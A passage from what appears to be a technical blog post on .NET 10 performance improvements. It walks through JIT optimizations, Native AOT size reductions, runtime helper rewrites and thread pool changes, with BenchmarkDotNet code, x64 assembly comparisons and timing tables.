[DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "numbers")] public partial class Tests { [Benchmark] [Arguments("128514801826028643102849196099776734920914944609068831724328541639470403818631040")] public int[] Parse(string numbers) { int[] results = new int[numbers.Length]; for (int i = 0; i &lt; numbers.Length; i++) { results[i] = numbers[i] - '0'; } return results; } }</code></pre><p>In this benchmark, we&rsquo;re iterating through an input <code>string</code>, which is a collection of 2-byte <code>char</code> elements, and we&rsquo;re storing the results into an array of 4-byte <code>int</code> elements. The core loop in the .NET 9 assembly looks like this:</p><pre><code>; .NET 9 M00_L00: mov edx,ecx movzx edi,word ptr [rbx+rdx*2+0C] add edi,0FFFFFFD0 mov [rax+rdx*4+10],edi inc ecx cmp r15d,ecx jg short M00_L00</code></pre><p>The <code>movzx edi,word ptr [rbx+rdx*2+0C]</code> is the read of <code>numbers[i]</code>, and the <code>mov [rax+rdx*4+10],edi</code> is the assignment to <code>results[i]</code>. <code>rdx</code> here is <code>i</code>, so each assignment is effectively having to do <code>i*2</code> to compute the byte offset of the <code>char</code> at index <code>i</code>, and similarly do <code>i*4</code> to compute the byte offset of the <code>int</code> at offset <code>i</code>. Now here&rsquo;s the .NET 10 assembly:</p><pre><code>; .NET 10 M00_L00: movzx edx,word ptr [rbx+rcx+0C] add edx,0FFFFFFD0 mov [rax+rcx*2+10],edx add rcx,2 dec r15d jne short M00_L00</code></pre><p>The multiplication in the <code>numbers[i]</code> read is gone. Instead, it can just increment <code>rcx</code> by 2 on each iteration, treating that as the offset to the <code>i</code>th <code>char</code>, and then instead of multiplying by 4 to compute the <code>int</code> offset, it just multiples by 2.</p></li> <li><strong>CSE integration with SSA</strong>. As with most compilers, the JIT employs common subexpression elimination (CSE) to find identical computations and avoid doing them repeatedly. <a href="https://github.com/dotnet/runtime/pull/106637">dotnet/runtime#106637</a> teaches the JIT how to do so in a more consistent manner by more fully integrating CSE with its Static Single Assignment (SSA) representation. This in turn allows for more optimizations to kick in, e.g. some of the strength reduction done around loop induction variables in .NET 9 wasn&rsquo;t applying as much as it should have, and now it will.</li> <li><strong><code>return someCondition ? true : false</code></strong>. There are often multiple ways to represent the same thing, but it often happens in compilers that certain patterns will be recognized during optimization while other equivalent ones won&rsquo;t, and it can therefore behoove the compiler to first normalize the representations to all use the better recognized one. There&rsquo;s a really common and interesting case of this with <code>return someCondition</code>, where, for reasons relating to the JIT&rsquo;s internal representation, the JIT is better able to optimize with the equivalent <code>return someCondition ? true : false</code>. <a href="https://github.com/dotnet/runtime/pull/107499">dotnet/runtime#107499</a> normalizes to the latter. As an example of this, consider this benchmark:<pre><code>// dotnet run -c Release -f net9.0 --filter "*" using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "i")] public partial class Tests { [Benchmark] [Arguments(42)] public bool Test1(int i) { if (i &gt; 10 &amp;&amp; i &lt; 20) return true; return false; } [Benchmark] [Arguments(42)] public bool Test2(int i) =&gt; i &gt; 10 &amp;&amp; i &lt; 20; }</code></pre><p>On .NET 9, that results in this assembly code for <code>Test1</code>:</p><pre><code>; .NET 9 ; Tests.Test1(Int32) sub esi,0B cmp esi,8 setbe al movzx eax,al ret ; Total bytes of code 13</code></pre><p>The JIT has successfully recognized that it can change the two comparisons to instead be a subtraction and a single comparison, as if the <code>i &gt; 10 &amp;&amp; i &lt; 20</code> were instead written as <code>(uint)(i - 11) &lt;= 8</code>. But for <code>Test2</code>, .NET 9 produces this:</p><pre><code>; .NET 9 ; Tests.Test2(Int32) xor eax,eax cmp esi,14 setl cl movzx ecx,cl cmp esi,0A cmovg eax,ecx ret ; Total bytes of code 18</code></pre><p>Because of how the return condition is being represented internally by the JIT, it&rsquo;s missing this particular optimization, and the assembly code more directly reflects what was written in the C#. But now in .NET 10, because of this normalization, we now get this for <code>Test2</code>, exactly what we got for <code>Test1</code>:</p><pre><code>; .NET 10 ; Tests.Test2(Int32) sub esi,0B cmp esi,8 setbe al movzx eax,al ret ; Total bytes of code 13</code></pre> </li> <li><strong>Bit tests</strong>. The C# compiler has a lot of flexibility in how it emits <code>switch</code> and <code>is</code> expressions. Consider a case like this: <code>c is ' ' or '\t' or '\r' or '\n'</code>. It could emit that as the equivalent of a series of cascading <code>if</code>/<code>else</code> branches, as an IL <code>switch</code> instruction, as a bit test, or as combinations of those. The C# compiler, though, doesn&rsquo;t have all of the information the JIT has, such as whether the process is 32-bit or 64-bit, or knowledge of what instructions cost on given hardware. With <a href="https://github.com/dotnet/runtime/pull/107831">dotnet/runtime#107831</a>, the JIT will now recognize more such expressions that can be implemented as a bit test and generate the code accordingly.<pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Runtime.CompilerServices; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "c")] public partial class Tests { [Benchmark] [Arguments('s')] public void Test(char c) { if (c is ' ' or '\t' or '\r' or '\n' or '.') { Handle(c); } [MethodImpl(MethodImplOptions.NoInlining)] static void Handle(char c) { } } }</code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Code Size</th> </tr> </thead> <tbody> <tr> <td>Test</td> <td>.NET 9.0</td> <td>0.4537 ns</td> <td>1.02</td> <td>58 B</td> </tr> <tr> <td>Test</td> <td>.NET 10.0</td> <td>0.1304 ns</td> <td>0.29</td> <td>44 B</td> </tr> </tbody> </table><p>It&rsquo;s also common to see bit tests implemented in C# against shifted values; a constant mask is created with bits set at various indices, and then an incoming value to check is tested by shifting a bit to the corresponding index and seeing whether it aligns with one in the mask. For example, here is how <code>Regex</code> tests to see whether a provided <code>UnicodeCategory</code> is one of those that composes the &ldquo;word&rdquo; class (`\w`):</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Globalization; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "uc")] public partial class Tests { [Benchmark] [Arguments(UnicodeCategory.DashPunctuation)] public bool Test(UnicodeCategory uc) =&gt; (WordCategoriesMask &amp; (1 &lt;&lt; (int)uc)) != 0; private const int WordCategoriesMask = 1 &lt;&lt; (int)UnicodeCategory.UppercaseLetter | 1 &lt;&lt; (int)UnicodeCategory.LowercaseLetter | 1 &lt;&lt; (int)UnicodeCategory.TitlecaseLetter | 1 &lt;&lt; (int)UnicodeCategory.ModifierLetter | 1 &lt;&lt; (int)UnicodeCategory.OtherLetter | 1 &lt;&lt; (int)UnicodeCategory.NonSpacingMark | 1 &lt;&lt; (int)UnicodeCategory.DecimalDigitNumber | 1 &lt;&lt; (int)UnicodeCategory.ConnectorPunctuation; }</code></pre><p>Previously, the JIT would end up emitting that similar to how it&rsquo;s written: a shift followed by a test. Now with <a href="https://github.com/dotnet/runtime/pull/111979">dotnet/runtime#111979</a> from <a href="https://github.com/varelen">@varelen</a>, it can emit it as a bit test.</p><pre><code>; .NET 9 ; Tests.Test(System.Globalization.UnicodeCategory) mov eax,1 shlx eax,eax,esi test eax,4013F setne al movzx eax,al ret ; Total bytes of code 22 ; .NET 10 ; Tests.Test(System.Globalization.UnicodeCategory) mov eax,4013F bt eax,esi setb al movzx eax,al ret ; Total bytes of code 15</code></pre> </li> <li><strong>Redundant sign extensions</strong>. With <a href="https://github.com/dotnet/runtime/pull/111305">dotnet/runtime#111305</a>, the JIT can now remove more redundant sign extensions (when you take a smaller size type, e.g. <code>int</code>, and convert it to a larger size type, e.g. <code>long</code>, while preserving the value&rsquo;s sign). For example, with a test like this <code>public ulong Test(int x) =&gt; (uint)x &lt; 10 ? (ulong)x &lt;&lt; 60 : 0</code>, the JIT can now emit a <code>mov</code> (just copy the bits) instead of <code>movsxd</code> (move with sign extension), since it knows from the first comparison that the shift will only ever be performed with a non-negative <code>x</code>.</li> <li><strong>Better division with BMI2</strong>. If the BMI2 instruction set is available, with <a href="https://github.com/dotnet/runtime/pull/116198">dotnet/runtime#116198</a> from <a href="https://github.com/Daniel-Svensson">@Daniel-Svensson</a> the JIT can now use the <code>mulx</code> instruction (&ldquo;Unsigned Multiply Without Affecting Flags&rdquo;) to implement integer division, e.g.<pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "value")] public partial class Tests { [Benchmark] [Arguments(12345)] public ulong Div10(ulong value) =&gt; value / 10; }</code></pre><p>results in:</p><pre><code>; .NET 9 ; Tests.Div10(UInt64) mov rdx,0CCCCCCCCCCCCCCCD mov rax,rsi mul rdx mov rax,rdx shr rax,3 ret ; Total bytes of code 24 ; .NET 10 ; Tests.Div10(UInt64) mov rdx,0CCCCCCCCCCCCCCCD mulx rax,rax,rsi shr rax,3 ret ; Total bytes of code 20</code></pre> </li> <li><strong>Better range comparison</strong>. When comparing a <code>ulong</code> expression against <code>uint.MaxValue</code>, rather than being emitted as a comparison, with <a href="https://github.com/dotnet/runtime/pull/113037">dotnet/runtime#113037</a> from <a href="https://github.com/shunkino">@shunkino</a> it can be handled more efficiently as a shift.<pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "x")] public partial class Tests { [Benchmark] [Arguments(12345)] public bool Test(ulong x) =&gt; x &lt;= uint.MaxValue; }</code></pre><p>resulting in:</p><pre><code>; .NET 9 ; Tests.Test(UInt64) mov eax,0FFFFFFFF cmp rsi,rax setbe al movzx eax,al ret ; Total bytes of code 15 ; .NET 10 ; Tests.Test(UInt64) shr rsi,20 sete al movzx eax,al ret ; Total bytes of code 11</code></pre> </li> <li><strong>Better dead branch elimination</strong>. The JIT&rsquo;s branch optimizer is already able to use implications from comparisons to statically determine the outcome of other branches. For example, if I have this:<pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "x")] public partial class Tests { [Benchmark] [Arguments(42)] public void Test(int x) { if (x &gt; 100) { if (x &gt; 10) { Console.WriteLine(); } } } }</code></pre><p>the JIT generates this on .NET 9:</p><pre><code>; .NET 9 ; Tests.Test(Int32) cmp esi,64 jg short M00_L00 ret M00_L00: jmp qword ptr [7766D3E64FA8] ; Total bytes of code 12</code></pre><p>Note there&rsquo;s only a single comparison against 100 (0x64), with the comparison against 10 elided (as it&rsquo;s implied by the previous comparison). However, there are many variations to this, and not all of them were handled equally well. Consider this:</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "x")] public partial class Tests { [Benchmark] [Arguments(42)] public void Test(int x) { if (x &lt; 16) return; if (x &lt; 8) Console.WriteLine(); } }</code></pre><p>Here, the <code>Console.WriteLine</code> ideally wouldn&rsquo;t appear in the emitted assembly at all, as it&rsquo;s never reachable. Alas, on .NET 9, we get this (the <code>jmp</code> instruction here is a tail call to <code>WriteLine</code>):</p><pre><code>; .NET 9 ; Tests.Test(Int32) push rbp mov rbp,rsp cmp esi,10 jl short M00_L00 cmp esi,8 jge short M00_L00 pop rbp jmp qword ptr [731ED8054FA8] M00_L00: pop rbp ret ; Total bytes of code 23</code></pre><p>With <a href="https://github.com/dotnet/runtime/pull/111766">dotnet/runtime#111766</a> on .NET 10, it successfully recognizes that by the time it gets to the <code>x &lt; 8</code>, that condition will always be <code>false</code>, and it can be eliminated. And once it&rsquo;s eliminated, the initial branch is also unnecessary. So the whole method reduces to this:</p><pre><code>; .NET 10 ; Tests.Test(Int32) ret ; Total bytes of code 1</code></pre> </li> <li><strong>Better floating-point conversion</strong>. <a href="https://github.com/dotnet/runtime/pull/114410">dotnet/runtime#114410</a> from <a href="https://github.com/saucecontrol">@saucecontrol</a>, <a href="https://github.com/dotnet/runtime/pull/114597">dotnet/runtime#114597</a> from <a href="https://github.com/saucecontrol">@saucecontrol</a>, and <a href="https://github.com/dotnet/runtime/pull/111595">dotnet/runtime#111595</a> from <a href="https://github.com/saucecontrol">@saucecontrol</a> all speed up conversions between floating-point and integers, such as by using <code>vcvtusi2s</code> when AVX512 is available, or when it isn&rsquo;t, avoiding the intermediate <code>double</code> conversion.<pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "i")] public partial class Tests { [Benchmark] [Arguments(42)] public float Compute(uint i) =&gt; i; }</code></pre><pre><code>; .NET 9 ; Tests.Compute(UInt32) mov eax,esi vxorps xmm0,xmm0,xmm0 vcvtsi2sd xmm0,xmm0,rax vcvtsd2ss xmm0,xmm0,xmm0 ret ; Total bytes of code 16 ; .NET 10 ; Tests.Compute(UInt32) vxorps xmm0,xmm0,xmm0 vcvtusi2ss xmm0,xmm0,esi ret ; Total bytes of code 11</code></pre> </li> <li><strong>Unrolling</strong>. When using <code>CopyTo</code> (or other &ldquo;memmove&rdquo;-based operations) with a constant source, <a href="https://github.com/dotnet/runtime/pull/108576">dotnet/runtime#108576</a> reduces costs by avoiding a redundant memory load. <a href="https://github.com/dotnet/runtime/pull/109036">dotnet/runtime#109036</a> unblocks more unrolling on Arm64 for <code>Equals</code>/<code>StartsWith</code>/<code>EndsWith</code>. And <a href="https://github.com/dotnet/runtime/pull/110893">dotnet/runtime#110893</a> enables unrolling non-zero fills (unrolling already happened for zero fills).<pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private char[] _chars = new char[100]; [Benchmark] public void Fill() =&gt; _chars.AsSpan(0, 16).Fill('x'); }</code></pre><pre><code>; .NET 9 ; Tests.Fill() push rbp mov rbp,rsp mov rdi,[rdi+8] test rdi,rdi je short M00_L00 cmp dword ptr [rdi+8],10 jb short M00_L00 add rdi,10 mov esi,10 mov edx,78 call qword ptr [7F3093FBF1F8]; System.SpanHelpers.Fill[[System.Char, System.Private.CoreLib]](Char ByRef, UIntPtr, Char) nop pop rbp ret M00_L00: call qword ptr [7F3093787810] int 3 ; Total bytes of code 49 ; .NET 10 ; Tests.Fill() push rbp mov rbp,rsp mov rax,[rdi+8] test rax,rax je short M00_L00 cmp dword ptr [rax+8],10 jl short M00_L00 add rax,10 vbroadcastss ymm0,dword ptr [78EFC70C9340] vmovups [rax],ymm0 vzeroupper pop rbp ret M00_L00: call qword ptr [78EFC7447B88] int 3 ; Total bytes of code 48</code></pre><p>Note the call to <code>SpanHelpers.Fill</code> in the .NET 9 assembly and the absence of it in the .NET 10 assembly.</p></li> </ul> <h2>Native AOT</h2><p>Native AOT is the ability for a .NET application to be compiled directly to assembly code at build-time. The JIT is still used for code generation, but only at build time; the JIT isn&rsquo;t part of the shipping app at all, and no code generation is performed at run-time. As such, most of the optimizations to the JIT already discussed, as well as optimizations throughput the rest of this post, apply to Native AOT equally. Native AOT presents some unique opportunities and challenges, however.</p><p>One super power of the Native AOT tool chain is the ability to interpret (some) code at build-time and use the results of that execution rather than performing the operation at run-time. This is particularly relevant for static constructors, where the constructor&rsquo;s code can be interpreted to initialize various <code>static readonly</code> fields, and then the contents of those fields can be persisted into the generated assembly; at run-time, the contents needs only be rehydrated from the assembly rather than being recomputed. This also potentially helps to make more code redundant and removable, if for example the static constructor and anything it (and only it) referenced were no longer needed. Of course, it would be dangerous and problematic if any arbitrary code could be run during build, so instead there&rsquo;s a very filtered allow list and specialized support for the most common and appropriate constructs. <a href="https://github.com/dotnet/runtime/pull/107575">dotnet/runtime#107575</a> augments this &ldquo;preinitialization&rdquo; capability to support spans sourced from arrays, such that using methods like <code>.AsSpan()</code> doesn&rsquo;t cause preinitialization to bail out. <a href="https://github.com/dotnet/runtime/pull/114374">dotnet/runtime#114374</a> also improved preinitialization, removing restrictions around accessing static fields of other types, calling methods on other types that have their own static constructors, and dereferencing pointers.</p><p>Conversely, Native AOT has its own challenges, specifically that size really matters and is harder to control. With a JIT available at run-time, code generation for only exactly what&rsquo;s needed can be deferred until run-time. With Native AOT, <em>all</em> assembly code generation needs to be done at build-time, which means the Native AOT tool chain needs to work hard to determine the least amount of code it needs to emit to support everything the app might need to do at run-time. Most of the effort on Native AOT in any given release ends up being about helping it to further decrease the size of generated code. For example:</p><ul> <li><a href="https://github.com/dotnet/runtime/pull/117411">dotnet/runtime#117411</a> enables folding bodies of generic instantations of the same method, essentially avoiding duplication by using the same code for copies of the same method where possible.</li> <li><a href="https://github.com/dotnet/runtime/pull/117080">dotnet/runtime#117080</a> similarly helps improve the existing method body deduplication logic.</li> <li><a href="https://github.com/dotnet/runtime/pull/117345">dotnet/runtime#117345</a> from <a href="https://github.com/huoyaoyuan">@huoyaoyuan</a> tweaks a bit of code in reflection that would previously artificially force the code to be preserved for all enumerators of all generic instantations of every collection type.</li> <li><a href="https://github.com/dotnet/runtime/pull/112782">dotnet/runtime#112782</a> adds the same distinction that already existed for <code>MethodTable</code>s for non-generic methods (&ldquo;is this method table visible to user code or not&rdquo;) to generic methods, allowing more metadata for the non-user visible ones to be optimized away.</li> <li><a href="https://github.com/dotnet/runtime/pull/118718">dotnet/runtime#118718</a> and <a href="https://github.com/dotnet/runtime/pull/118832">dotnet/runtime#118832</a> enable size reductions related to boxed enums. The former tweaks a few methods in <code>Thread</code>, <code>GC</code>, and <code>CultureInfo</code> to avoid boxing some enums, which means the code for those needn&rsquo;t be generated. The latter tweaks the implementation of <code>RuntimeHelpers.CreateSpan</code>, which is used by the C# compiler as part of creating spans with constructs like collection expressions. <code>CreateSpan</code> is a generic method, and the Native AOT toolchain&rsquo;s whole-program analysis would end up treating the generic type parameter as being &ldquo;reflected on,&rdquo; meaning the compiler had to assume any type parameter would be used with reflection and thus had to preserve relevant metadata. When used with enums, it would need to ensure support for boxed enums was kept around, and <code>System.Console</code> has such a use with an enum. That in turn meant that a simple &ldquo;hello, world&rdquo; console app couldn&rsquo;t trim away that boxed enum reflection support; now it can.</li> </ul> <h2>VM</h2><p>The .NET runtime offers a wide range of services to managed applications, most obviously the garbage collector and the JIT compiler, but it also encompasses a host of other capabilities: assembly and type loading, exception handling, virtual method dispatch, interoperability support, stub generation, and so on. Collectively, all of these features are referred to as being a part of the .NET Virtual Machine (VM).</p><p><a href="https://github.com/dotnet/runtime/pull/108167">dotnet/runtime#108167</a> and <a href="https://github.com/dotnet/runtime/pull/109135">dotnet/runtime#109135</a> rewrote various runtime helpers from C in the runtime to C# in <code>System.Private.CoreLib</code>, including the &ldquo;unboxing&rdquo; helpers, which are used to unbox <code>object</code>s to value types in niche scenarios. This rewrite avoids overheads associated with transitioning between native and managed and also enables the JIT an opportunity to optimize in the context of callers, such as with inlining. Note that these unboxing helpers are only used in obscure situations, so it requires a bit of a complicated benchmark to demonstrate the impact:</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Runtime.CompilerServices; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser(0)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private object[] _objects = [new GenericStruct<mystruct>()]; [Benchmark] public void Unbox() =&gt; Unbox<genericstruct>&gt;(_objects[0]); private void Unbox<t>(object o) where T : struct, IStaticMethod<t> { T? local = (T?)o; if (local.HasValue) { T localCopy = local.Value; T.Method(ref localCopy); } } public interface IStaticMethod<t> { public static abstract void Method(ref T param); } struct MyStruct : IStaticMethod<mystruct> { public static void Method(ref MyStruct param) { } } struct GenericStruct<t> : IStaticMethod<genericstruct>&gt; where T : IStaticMethod<t> { public T Value; [MethodImpl(MethodImplOptions.NoInlining)] public static void Method(ref GenericStruct<t> value) =&gt; T.Method(ref value.Value); } }</t></t></genericstruct></t></mystruct></t></t></t></genericstruct></mystruct></code></pre> <table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Code Size</th> </tr> </thead> <tbody> <tr> <td>Unbox</td> <td>.NET 9.0</td> <td>1.626 ns</td> <td>1.00</td> <td>148 B</td> </tr> <tr> <td>Unbox</td> <td>.NET 10.0</td> <td>1.379 ns</td> <td>0.85</td> <td>148 B</td> </tr> </tbody> </table><p>What it means to move the implementation from native to managed is most easily seen just by looking at the generated assembly. Other than uninteresting and non-impactful changes in which registers happen to get assigned, the only real difference between .NET 9 and .NET 10 is a single instruction:</p><pre><code>- call CORINFO_HELP_UNBOX_NULLABLE + call System.Runtime.CompilerServices.CastHelpers.Unbox_Nullable(Byte ByRef, System.Runtime.CompilerServices.MethodTable*, System.Object)</code></pre><p><a href="https://github.com/dotnet/runtime/pull/115284">dotnet/runtime#115284</a> streamlines how the runtime sets up and tears down the little code blocks (&ldquo;funclets&rdquo;) the runtime uses to implement <code>catch</code>/<code>finally</code> on x64. Historically, these funclets acted a lot like tiny functions, saving and restoring non-volatile CPU registers on entry and exit (a &ldquo;non-volatile&rdquo; register is effectively one where the caller can expect it to contain the same value after a function call as it did before the function call). This PR changes the contract so that funclets no longer need to preserve those registers themselves; instead, the runtime takes care of preserving them. That shrinks the prologs and epilogs the JIT emits for funclets, reduces instruction count and code size, and lowers the cost of entering and exiting exception handlers.</p><p>With <a href="https://github.com/dotnet/runtime/pull/114462">dotnet/runtime#114462</a>, the runtime now uses a single shared &ldquo;template&rdquo; for many of the small executable &ldquo;stubs&rdquo; it needs at runtime; stubs are tiny chunks of machine code that act as jump points, call counters, or patchable trampolines. Previously, each memory allocation for stubs would regenerate the same instructions over and over. The new approach builds one copy of the stub code in a read-only page and then maps that same physical page into every place it&rsquo;s needed, while giving each allocation its own writable page for the per-stub data that changes at runtime. This lets hundreds of virtual stub pages all point to one physical code page, cutting memory use, reducing startup work, and improving instruction cache locality.</p><p>Also interesting are <a href="https://github.com/dotnet/runtime/pull/117218">dotnet/runtime#117218</a> and <a href="https://github.com/dotnet/runtime/pull/116031">dotnet/runtime#116031</a>, which together help optimize the generation of stack traces in large, heavily multi-threaded applications when being profiled.</p><h2>Threading</h2><p>The <code>ThreadPool</code> underlies most work in most .NET apps and services. It&rsquo;s a critical-path component that has to be able to deal with all manners of workloads efficiently.</p><p><a href="https://github.com/dotnet/runtime/pull/109841">dotnet/runtime#109841</a> implemented an opt-in feature that <a href="https://github.com/dotnet/runtime/pull/112796">dotnet/runtime#112796</a> then enabled by default for .NET 10. The idea behind it is fairly straightforward, but to understand it, we first need to examine how the thread pool queues work items. The thread pool has multiple queues, typically one &ldquo;global&rdquo; queue and then one &ldquo;local&rdquo; queue per thread in the pool. When threads outside of the pool queue work, that work goes to the global queue, and when a thread pool thread queues work, especially a <code>Task</code> or work related to an <code>await</code>, that work item typically goes to that thread&rsquo;s local queue. Then when a thread pool thread finishes whatever it was doing and goes in search of more work, it first checks its own local queue (treating its local queue as highest priority), then if that&rsquo;s empty it checks the global queue, and then if that&rsquo;s empty it goes and helps out the other threads in the pool by searching their queues for work to be done. This is all in an attempt to a) minimize contention on the global queue (if threads are mainly queueing and dequeuing from their own local queue, they&rsquo;re not contending with each other), and b) prioritize work that&rsquo;s logically part of already started work (the only way for work to get into a local queue is if that thread was processing a work item that created it). Generally, this works out well, but sometimes we get into degenerate scenarios, typically when an app does something that goes against best practices&hellip; like blocking.</p><p>Blocking a thread pool thread means that thread can&rsquo;t service other work coming into the pool. If the blocking is brief, it&rsquo;s generally fine, and if it&rsquo;s longer, the thread pool tries to accommodate it by injecting more threads and finding a steady state at which things hum along. But a certain kind of blocking can be really problematic: <a href="https://devblogs.microsoft.com/dotnet/should-i-expose-synchronous-wrappers-for-asynchronous-methods/">&ldquo;sync over async&rdquo;</a>. With &ldquo;sync over async&rdquo;, one thread blocks while waiting for an asynchronous operation to complete, and if <em>that</em> operation needs to do something on the thread pool in order to complete, you now have one thread pool thread blocked waiting for another thread pool thread to pick up a particular work item and process it. This can quickly lead to the whole pool getting into a jam&hellip; especially with the thread local queues. If a thread is blocked on an operation that depends on work items in that thread&rsquo;s local queue getting processed, that work item being picked off now depends on the global queue being exhausted and another thread coming along and stealing the work item from this thread&rsquo;s queue. If there&rsquo;s a steady stream of incoming work into the global queue, though, that will never happen; essentially, the highest priority work item has become the lowest priority work item.</p><p>So, back to these PRs. The idea is fairly simple: when the thread is about to block, and in particular when it&rsquo;s about to block waiting on a <code>Task</code>, it first dumps its entire local queue into the global queue. That way, this work which was highest priority for the blocked thread has a fairer chance of being processed by other threads, rather than it being the lowest priority work for everyone. We can try to see the impact of this with a specifically-crafted workload:</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" // dotnet run -c Release -f net10.0 --filter "*" using System.Diagnostics; int numThreads = Environment.ProcessorCount; ThreadPool.SetMaxThreads(numThreads, 1); ManualResetEventSlim start = new(); CountdownEvent allDone = new(numThreads); new Thread(() =&gt; { while (true) { for (int i = 0; i &lt; 10_000; i++) { ThreadPool.QueueUserWorkItem(_ =&gt; Thread.SpinWait(1)); } Thread.Yield(); } }) { IsBackground = true }.Start(); for (int i = 0; i &lt; numThreads; i++) { ThreadPool.QueueUserWorkItem(_ =&gt; { start.Wait(); TaskCompletionSource tcs = new(); const int LocalItemsPerThread = 4; var remaining = LocalItemsPerThread; for (int j = 0; j &lt; LocalItemsPerThread; j++) { Task.Run(() =&gt; { Thread.SpinWait(100); if (Interlocked.Decrement(ref remaining) == 0) { tcs.SetResult(); } }); } tcs.Task.Wait(); allDone.Signal(); }); } var sw = Stopwatch.StartNew(); start.Set(); Console.WriteLine(allDone.Wait(20_000) ? $"Completed: {sw.ElapsedMilliseconds}ms" : $"Timed out after {sw.ElapsedMilliseconds}ms");</code></pre><p>This is:</p><ul> <li>creating a noise thread that tries to keep the global queue inundated with new work</li> <li>queuing <code>Environment.ProcessorCount</code> work items, each of which queues four work items to the local queue that all do a little work and then blocks on a <code>Task</code> until they all complete</li> <li>waiting for those <code>Environment.ProcessorCount</code> work items to complete</li> </ul><p>When I run this on .NET 9, it hangs, because there&rsquo;s so much work in the global queue, no threads are able to process those sub-work items that are necessary to unblock the main work items:</p><pre><code>Timed out after 20002ms</code></pre><p>On .NET 10, it generally completes almost instantly:</p><pre><code>Completed: 4ms</code></pre><p>Some other tweaks were made to the pool as well:</p><ul> <li><a href="https://github.com/dotnet/runtime/pull/115402">dotnet/runtime#115402</a> reduced the amount of spin-waiting done on Arm processors, bringing it more in line with x64.</li> <li><a href="https://github.com/dotnet/runtime/pull/112789">dotnet/runtime#112789</a> reduced the frequency at which the thread pool checked CPU utilization, as in some circumstances it was adding noticeable overhead, and makes the frequency configurable.</li> <li><a href="https://github.com/dotnet/runtime/pull/108135">dotnet/runtime#108135</a> from <a href="https://github.com/AlanLiu90">@AlanLiu90</a> removed a bit of lock contention that could happen under load when starting new thread pool threads.</li> </ul><p>On the subject of locking, and only for developers that find themselves with a strong need to do really low-level low-lock development, <a href="https://github.com/dotnet/runtime/pull/107843">dotnet/runtime#107843</a> from <a href="https://github.com/hamarb123">@hamarb123</a> adds two new methods to the <code>Volatile</code> class: <code>ReadBarrier</code> and <code>WriteBarrier</code>. A read barrier has &ldquo;load acquire&rdquo; semantics, and is sometimes referred to as a &ldquo;downward fence&rdquo;: it prevents instructions from being reordered in such a way that memory accesses below/after the barrier move to above/before it. In contrast, a write barrier has &ldquo;store release&rdquo; semantics, and is sometimes referred to as an &ldquo;upwards fence&rdquo;: it prevents instructions from being reordered in such a way that memory accesses above/before the barrier move to below/after it. I find it helps to think about this with regards to a <code>lock</code>:</p><pre><code>A; lock (...) { B; } C;</code></pre><p>While in practice the implementation may provide stronger fences, by specification entering a <code>lock</code> has acquire semantics and exiting a <code>lock</code> has release semantics. Imagine if the instructions in the above code could be reordered like this:</p><pre><code>A; B; lock (...) { } C;</code></pre><p>or like this:</p><pre><code>A; lock (...) { } B; C;</code></pre><p>Both of those would be really bad. Thankfully, the barriers help us here. The acquire / read barrier semantics of entering the lock are a downwards fence: logically the brace that starts the lock puts downwards pressure on everything inside the lock to not move to before it, and the brace that ends the lock puts upwards pressure on everything inside the lock to not move to after it. Interestingly, nothing about the semantics of these barriers prevents this from happening:</p><pre><code>lock (...) { A; B; C; }</code></pre><p>These barriers are referred to as &ldquo;half fences&rdquo;; the read barrier prevents later things from moving earlier, but not the 